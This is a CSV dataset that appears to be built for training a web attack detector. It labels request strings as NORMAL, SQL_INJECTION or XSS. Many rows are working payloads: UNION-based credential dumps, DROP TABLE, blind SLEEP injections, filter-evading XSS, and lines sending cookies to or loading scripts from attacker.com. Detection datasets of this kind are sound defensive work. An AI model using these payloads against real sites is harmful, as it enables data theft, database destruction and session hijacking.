text,label,threat_type
login?user=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
item/cart/add?item_id=554&qty=1?ref=homepage,0,NORMAL
') or ('1'='1'--,1,SQL_INJECTION
SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
"item?id=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
filter?category=admin_user_2024&sort=desc,0,NORMAL
search?q=dashboard?view=summary,0,NORMAL
1' ORDER BY 2--+,1,SQL_INJECTION
item?id=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
index.html,0,NORMAL
api/search?term=cart/checkout?step=billing,0,NORMAL
wireless mouse,0,NORMAL
search?q=dashboard?view=summary,0,NORMAL
%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
view_order?order_id=983214,0,NORMAL
filter?category=catalog?page=2&sort=price_asc&sort=desc,0,NORMAL
"<object data=""javascript:alert(1)"">",2,XSS
"search?q=""><script>alert(document.domain)</script>",2,XSS
"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
filter?category=product?id=102&category=electronics&sort=desc,0,NORMAL
search?q=cart/add?item_id=554&qty=1,0,NORMAL
settings?theme=dark&lang=en,0,NORMAL
"' UNION SELECT username, password FROM users--",1,SQL_INJECTION
search?q=alice.smith@example.com,0,NORMAL
' or 1=1/*,1,SQL_INJECTION
filter=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
' HAVING 1=1 --,1,SQL_INJECTION
filter?category=about-us&sort=desc,0,NORMAL
filter?category=assets/js/bundle.min.js&sort=desc,0,NORMAL
' HAVING 1=1 --,1,SQL_INJECTION
query=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
filter?category=checkout?shipping=standard&promo=WELCOME10&sort=desc,0,NORMAL
"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
search?q=about-us,0,NORMAL
item/cart/add?item_id=554&qty=1?ref=homepage,0,NORMAL
' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
1; DROP TABLE users--,1,SQL_INJECTION
order/status?tracking=FEDEX-889922,0,NORMAL
query=best+headphones+under+100&page=1,0,NORMAL
shoes for running,0,NORMAL
%27%20OR%201%3D1%20--,1,SQL_INJECTION
"search?q=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
admin' #,1,SQL_INJECTION
"' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
"item?id=' UNION SELECT username, password FROM users--",1,SQL_INJECTION
' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
search?q=mechanical+pencil+0.5mm,0,NORMAL
item/help/return-policy?ref=homepage,0,NORMAL
' HAVING 1=1 --,1,SQL_INJECTION
filter=1' AND SLEEP(10)--,1,SQL_INJECTION
browse?tag=apple+macbook+pro+m2,0,NORMAL
<svg onload=alert(1)>,2,XSS
api/search?term=alice.smith@example.com,0,NORMAL
filter?category=password123!&sort=desc,0,NORMAL
api/search?term=profile/edit?name=Johnathan,0,NORMAL
<details open ontoggle=alert(1)>,2,XSS
search?q=index.html,0,NORMAL
filter?category=download/specs-datasheet.pdf&sort=desc,0,NORMAL
"item?id=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
query=<img src=x onerror=alert('XSS')>,2,XSS
search?q=admin'/*,1,SQL_INJECTION
%27%20OR%201%3D1%20--,1,SQL_INJECTION
item?id=' OR 1=1 --,1,SQL_INJECTION
' HAVING 1=1 --,1,SQL_INJECTION
browse?tag=faq/shipping-times,0,NORMAL
profile/edit?name=Johnathan,0,NORMAL
filter=1' ORDER BY 2--+,1,SQL_INJECTION
newsletter/subscribe?email=user@test.org,0,NORMAL
login?user=1' AND SLEEP(10)--,1,SQL_INJECTION
reviews?rating=5&verified=true,0,NORMAL
browse?tag=wireless+mouse,0,NORMAL
browse?tag=gaming+monitor,0,NORMAL
assets/js/bundle.min.js,0,NORMAL
browse?tag=reviews?rating=5&verified=true,0,NORMAL
python programming book,0,NORMAL
apple macbook pro m2,0,NORMAL
' HAVING 1=1 --,1,SQL_INJECTION
' or 1=1/*,1,SQL_INJECTION
api/search?term=python+programming+book,0,NORMAL
query=account/security/2fa-setup&page=1,0,NORMAL
' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
account/security/2fa-setup,0,NORMAL
query=account/security/2fa-setup&page=1,0,NORMAL
item/about-us?ref=homepage,0,NORMAL
search?q=<body onload=alert('XSS')>,2,XSS
admin_user_2024,0,NORMAL
search?q=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
browse?tag=python+programming+book,0,NORMAL
<select autofocus onfocus=alert(1)>,2,XSS
john_doe,0,NORMAL
newsletter/subscribe?email=user@test.org,0,NORMAL
"""><script>alert(document.domain)</script>",2,XSS
%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
search?q=<svg onload=alert(1)>,2,XSS
blog/post-10-cybersecurity-tips,0,NORMAL
search?q=spring+sale+discount,0,NORMAL
"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
admin'/*,1,SQL_INJECTION
filter=1' ORDER BY 3--+,1,SQL_INJECTION
"query=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
item?id=1; DROP TABLE users--,1,SQL_INJECTION
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
api/search?term=products/audio/bluetooth-speakers,0,NORMAL
search?q=spring+sale+discount,0,NORMAL
api/search?term=laptop,0,NORMAL
<script>alert('XSS')</script>,2,XSS
redirect=<script>alert(1)</script>,2,XSS
api/search?term=alice.smith@example.com,0,NORMAL
query=cart/add?item_id=554&qty=1&page=1,0,NORMAL
%27%20OR%201%3D1%20--,1,SQL_INJECTION
api/search?term=privacy-policy,0,NORMAL
"login?user="" OR ""1""=""1",1,SQL_INJECTION
"redirect=""><script>alert(document.domain)</script>",2,XSS
cotton t-shirt blue,0,NORMAL
download/specs-datasheet.pdf,0,NORMAL
shoes for running,0,NORMAL
api/v1/users?limit=10&offset=20,0,NORMAL
filter=' OR '1'='1,1,SQL_INJECTION
mechanical keyboard,0,NORMAL
"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
comment=<script>alert(1)</script>,2,XSS
browse?tag=products/audio/bluetooth-speakers,0,NORMAL
search?q=<details open ontoggle=alert(1)>,2,XSS
search?q=4k+oled+television+lg,0,NORMAL
cart/checkout?step=billing,0,NORMAL
SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
1; DROP TABLE users--,1,SQL_INJECTION
browse?tag=shoes+for+running,0,NORMAL
"redirect=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
search?q=assets/js/bundle.min.js,0,NORMAL
""" OR ""1""=""1",1,SQL_INJECTION
reviews?rating=5&verified=true,0,NORMAL
comment='><script>alert('PWNED')</script>,2,XSS
api/v1/users?limit=10&offset=20,0,NORMAL
password123!,0,NORMAL
alice.smith@example.com,0,NORMAL
search?q=spring+sale+discount,0,NORMAL
"search?q=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
<img src=x onerror=alert('XSS')>,2,XSS
item?id=' HAVING 1=1 --,1,SQL_INJECTION
gaming monitor,0,NORMAL
redirect=<marquee onstart=alert(1)>,2,XSS
<img src=x onerror=alert('XSS')>,2,XSS
query=search?q=4k+oled+television+lg&page=1,0,NORMAL
"query=""><script>alert(document.domain)</script>",2,XSS
index.html,0,NORMAL
"search?q=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
"redirect=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
<img src=x onerror=alert('XSS')>,2,XSS
<script>alert(1)</script>,2,XSS
"query=<object data=""javascript:alert(1)"">",2,XSS
privacy-policy,0,NORMAL
index.html,0,NORMAL
<isindex type=image src=1 onerror=alert(1)>,2,XSS
query=<select autofocus onfocus=alert(1)>,2,XSS
search?q=index.html,0,NORMAL
password123!,0,NORMAL
comment=<isindex type=image src=1 onerror=alert(1)>,2,XSS
search?q=1; DROP TABLE users--,1,SQL_INJECTION
') or ('1'='1'--,1,SQL_INJECTION
redirect=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
search?q=4k+oled+television+lg,0,NORMAL
search?q=4k+oled+television+lg,0,NORMAL
<body onload=alert('XSS')>,2,XSS
query=newsletter/subscribe?email=user@test.org&page=1,0,NORMAL
api/search?term=cotton+t-shirt+blue,0,NORMAL
query=privacy-policy&page=1,0,NORMAL
browse?tag=dashboard?view=summary,0,NORMAL
"""><script>alert(document.domain)</script>",2,XSS
api/v1/users?limit=10&offset=20,0,NORMAL
admin_user_2024,0,NORMAL
"query=<video><source onerror=""javascript:alert(1)"">",2,XSS
search?q=' OR 'a'='a,1,SQL_INJECTION
redirect=<marquee onstart=alert(1)>,2,XSS
newsletter/subscribe?email=user@test.org,0,NORMAL
"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
' OR '1'='1,1,SQL_INJECTION
search?q=spring+sale+discount,0,NORMAL
') or ('1'='1'--,1,SQL_INJECTION
redirect=<input autofocus onfocus=alert(1)>,2,XSS
"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
query=blog/post-10-cybersecurity-tips&page=1,0,NORMAL
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
"<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
<svg/onload=alert('XSS')>,2,XSS
login?user=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
blog/post-10-cybersecurity-tips,0,NORMAL
account/security/2fa-setup,0,NORMAL
search?q=api/v1/users?limit=10&offset=20,0,NORMAL
cotton t-shirt blue,0,NORMAL
query=shoes+for+running&page=1,0,NORMAL
profile/edit?name=Johnathan,0,NORMAL
mechanical keyboard,0,NORMAL
shoes for running,0,NORMAL
<details open ontoggle=alert(1)>,2,XSS
item/api/v1/users?limit=10&offset=20?ref=homepage,0,NORMAL
"search?q=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
1' ORDER BY 3--+,1,SQL_INJECTION
filter=' HAVING 1=1 --,1,SQL_INJECTION
cotton t-shirt blue,0,NORMAL
download/specs-datasheet.pdf,0,NORMAL
login?user=1' AND SLEEP(10)--,1,SQL_INJECTION
item/catalog?page=2&sort=price_asc?ref=homepage,0,NORMAL
"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
terms-and-conditions,0,NORMAL
') or ('1'='1'--,1,SQL_INJECTION
dashboard?view=summary,0,NORMAL
item/dashboard?view=summary?ref=homepage,0,NORMAL
python programming book,0,NORMAL
about-us,0,NORMAL
item/shoes+for+running?ref=homepage,0,NORMAL
login?user=1' ORDER BY 2--+,1,SQL_INJECTION
search?q=<details open ontoggle=alert(1)>,2,XSS
checkout?shipping=standard&promo=WELCOME10,0,NORMAL
products/audio/bluetooth-speakers,0,NORMAL
"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
<script>alert('XSS')</script>,2,XSS
search?q=alice.smith@example.com,0,NORMAL
comment=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
filter=admin' #,1,SQL_INJECTION
"filter=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
item/apple+macbook+pro+m2?ref=homepage,0,NORMAL
query=<svg/onload=alert('XSS')>,2,XSS
item/cotton+t-shirt+blue?ref=homepage,0,NORMAL
search?q=<marquee onstart=alert(1)>,2,XSS
"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
usb c cable 2m,0,NORMAL
<marquee onstart=alert(1)>,2,XSS
"search?q=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
admin_user_2024,0,NORMAL
contact,0,NORMAL
"redirect=<video><source onerror=""javascript:alert(1)"">",2,XSS
search?q=1; DROP TABLE users--,1,SQL_INJECTION
item?id=' or 1=1#,1,SQL_INJECTION
<svg/onload=alert('XSS')>,2,XSS
<svg/onload=alert('XSS')>,2,XSS
item/products/audio/bluetooth-speakers?ref=homepage,0,NORMAL
redirect=<svg onload=alert(1)>,2,XSS
' or 1=1/*,1,SQL_INJECTION
search?q=reviews?rating=5&verified=true,0,NORMAL
"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
item/gaming+monitor?ref=homepage,0,NORMAL
item?id=) or ('1'='1,1,SQL_INJECTION
search?q=gaming+monitor,0,NORMAL
contact,0,NORMAL
checkout?shipping=standard&promo=WELCOME10,0,NORMAL
' HAVING 1=1 --,1,SQL_INJECTION
item?id=' HAVING 1=1 --,1,SQL_INJECTION
"search?q=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
query=cotton+t-shirt+blue&page=1,0,NORMAL
admin_user_2024,0,NORMAL
filter?category=cart/add?item_id=554&qty=1&sort=desc,0,NORMAL
"query=""><script>alert(document.domain)</script>",2,XSS
""" OR ""1""=""1",1,SQL_INJECTION
item/assets/css/main.css?ref=homepage,0,NORMAL
<svg/onload=alert('XSS')>,2,XSS
terms-and-conditions,0,NORMAL
admin' #,1,SQL_INJECTION
privacy-policy,0,NORMAL
<svg/onload=alert('XSS')>,2,XSS
browse?tag=john_doe,0,NORMAL
item/search?q=4k+oled+television+lg?ref=homepage,0,NORMAL
filter=' or 1=1/*,1,SQL_INJECTION
api/search?term=profile/edit?name=Johnathan,0,NORMAL
query=<svg/onload=alert('XSS')>,2,XSS
terms-and-conditions,0,NORMAL
1' ORDER BY 1--+,1,SQL_INJECTION
images/banner-sale.jpg,0,NORMAL
settings?theme=dark&lang=en,0,NORMAL
"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
filter?category=dashboard?view=summary&sort=desc,0,NORMAL
filter?category=admin_user_2024&sort=desc,0,NORMAL
api/search?term=profile/edit?name=Johnathan,0,NORMAL
<svg/onload=alert('XSS')>,2,XSS
"search?q=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
api/search?term=shoes+for+running,0,NORMAL
<img src=x onerror=alert('XSS')>,2,XSS
item?id=1' ORDER BY 3--+,1,SQL_INJECTION
filter?category=products/audio/bluetooth-speakers&sort=desc,0,NORMAL
<input autofocus onfocus=alert(1)>,2,XSS
assets/css/main.css,0,NORMAL
account/security/2fa-setup,0,NORMAL
<body onload=alert('XSS')>,2,XSS
"search?q=<video><source onerror=""javascript:alert(1)"">",2,XSS
home,0,NORMAL
admin' --,1,SQL_INJECTION
' or 1=1/*,1,SQL_INJECTION
api/search?term=search?q=spring+sale+discount,0,NORMAL
"search?q=""><script>alert(document.domain)</script>",2,XSS
item/privacy-policy?ref=homepage,0,NORMAL
search?q=products/audio/bluetooth-speakers,0,NORMAL
item/newsletter/subscribe?email=user@test.org?ref=homepage,0,NORMAL
mechanical keyboard,0,NORMAL
"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
"comment=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
order/status?tracking=FEDEX-889922,0,NORMAL
view_order?order_id=983214,0,NORMAL
search?q=ergonomic+chair+mesh,0,NORMAL
laptop,0,NORMAL
1' ORDER BY 3--+,1,SQL_INJECTION
search?q=wireless+mouse,0,NORMAL
<img src=x onerror=alert('XSS')>,2,XSS
search?q=' HAVING 1=1 --,1,SQL_INJECTION
filter?category=wireless+mouse&sort=desc,0,NORMAL
"redirect=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
%27%20OR%201%3D1%20--,1,SQL_INJECTION
login?user=1' ORDER BY 1--+,1,SQL_INJECTION
redirect=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
gaming monitor,0,NORMAL
shoes for running,0,NORMAL
filter?category=newsletter/subscribe?email=user@test.org&sort=desc,0,NORMAL
"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
api/search?term=cart/add?item_id=554&qty=1,0,NORMAL
filter?category=order/status?tracking=FEDEX-889922&sort=desc,0,NORMAL
best headphones under 100,0,NORMAL
view_order?order_id=983214,0,NORMAL
"1' UNION SELECT null, null, null--",1,SQL_INJECTION
redirect=<body onload=alert('XSS')>,2,XSS
checkout?shipping=standard&promo=WELCOME10,0,NORMAL
password123!,0,NORMAL
search?q=profile/edit?name=Johnathan,0,NORMAL
query=<select autofocus onfocus=alert(1)>,2,XSS
"redirect=<object data=""javascript:alert(1)"">",2,XSS
filter=) or ('1'='1,1,SQL_INJECTION
browse?tag=dashboard?view=summary,0,NORMAL
<svg onload=alert(1)>,2,XSS
<input autofocus onfocus=alert(1)>,2,XSS
mechanical keyboard,0,NORMAL
"redirect=<script src=""http://attacker.com/malicious.js""></script>",2,XSS
query=privacy-policy&page=1,0,NORMAL
search?q=4k+oled+television+lg,0,NORMAL
api/search?term=download/specs-datasheet.pdf,0,NORMAL
search?q=alice.smith@example.com,0,NORMAL
' OR '1'='1,1,SQL_INJECTION
filter?category=best+headphones+under+100&sort=desc,0,NORMAL
search?q=spring+sale+discount,0,NORMAL
admin' #,1,SQL_INJECTION
"login?user=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
1' ORDER BY 1--+,1,SQL_INJECTION
item/search?q=ergonomic+chair+mesh?ref=homepage,0,NORMAL
' HAVING 1=1 --,1,SQL_INJECTION
search?q=contact,0,NORMAL
search?q=password123!,0,NORMAL
<isindex type=image src=1 onerror=alert(1)>,2,XSS
search?q=contact,0,NORMAL
1' ORDER BY 3--+,1,SQL_INJECTION
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
admin' #,1,SQL_INJECTION
1' ORDER BY 2--+,1,SQL_INJECTION
"comment=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
<script>alert('XSS')</script>,2,XSS
item?id=1' ORDER BY 1--+,1,SQL_INJECTION
search?q=SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
"redirect=<video><source onerror=""javascript:alert(1)"">",2,XSS
john_doe,0,NORMAL
query=<svg/onload=alert('XSS')>,2,XSS
query=laptop&page=1,0,NORMAL
filter?category=cart/add?item_id=554&qty=1&sort=desc,0,NORMAL
search?q=<script>alert(1)</script>,2,XSS
profile/edit?name=Johnathan,0,NORMAL
' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
login?user=' OR '1'='1,1,SQL_INJECTION
search?q=apple+macbook+pro+m2,0,NORMAL
"search?q=<object data=""javascript:alert(1)"">",2,XSS
browse?tag=assets/css/main.css,0,NORMAL
login?user=%27%20OR%201%3D1%20--,1,SQL_INJECTION
"search?q=<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
search?q=1' AND SLEEP(10)--,1,SQL_INJECTION
catalog?page=2&sort=price_asc,0,NORMAL
"query=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
query=<svg/onload=alert('XSS')>,2,XSS
browse?tag=checkout?shipping=standard&promo=WELCOME10,0,NORMAL
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
assets/css/main.css,0,NORMAL
api/search?term=mechanical+keyboard,0,NORMAL
"""><script>alert(document.domain)</script>",2,XSS
<details open ontoggle=alert(1)>,2,XSS
1; DROP TABLE users--,1,SQL_INJECTION
search?q=mechanical+keyboard,0,NORMAL
login?user=' HAVING 1=1 --,1,SQL_INJECTION
comment=<script>alert(1)</script>,2,XSS
item/reviews?rating=5&verified=true?ref=homepage,0,NORMAL
newsletter/subscribe?email=user@test.org,0,NORMAL
search?q=cart/checkout?step=billing,0,NORMAL
search?q=search?q=ergonomic+chair+mesh,0,NORMAL
shoes for running,0,NORMAL
' OR 1=1 --,1,SQL_INJECTION
<details open ontoggle=alert(1)>,2,XSS
newsletter/subscribe?email=user@test.org,0,NORMAL
browse?tag=assets/css/main.css,0,NORMAL
item/password123!?ref=homepage,0,NORMAL
images/banner-sale.jpg,0,NORMAL
"filter=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
' HAVING 1=1 --,1,SQL_INJECTION
query=images/banner-sale.jpg&page=1,0,NORMAL
apple macbook pro m2,0,NORMAL
browse?tag=apple+macbook+pro+m2,0,NORMAL
"query=<script src=""http://attacker.com/malicious.js""></script>",2,XSS
login?user=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
item/laptop?ref=homepage,0,NORMAL
1' ORDER BY 3--+,1,SQL_INJECTION
"search?q=<script src=""http://attacker.com/malicious.js""></script>",2,XSS
1' ORDER BY 3--+,1,SQL_INJECTION
query=assets/js/bundle.min.js&page=1,0,NORMAL
item?id=admin' #,1,SQL_INJECTION
<svg/onload=alert('XSS')>,2,XSS
assets/js/bundle.min.js,0,NORMAL
"<object data=""javascript:alert(1)"">",2,XSS
search?q=' OR 'a'='a,1,SQL_INJECTION
admin_user_2024,0,NORMAL
faq/shipping-times,0,NORMAL
redirect=<body onload=alert('XSS')>,2,XSS
cotton t-shirt blue,0,NORMAL
home,0,NORMAL
filter?category=john_doe&sort=desc,0,NORMAL
api/search?term=password123!,0,NORMAL
login?user=1' ORDER BY 2--+,1,SQL_INJECTION
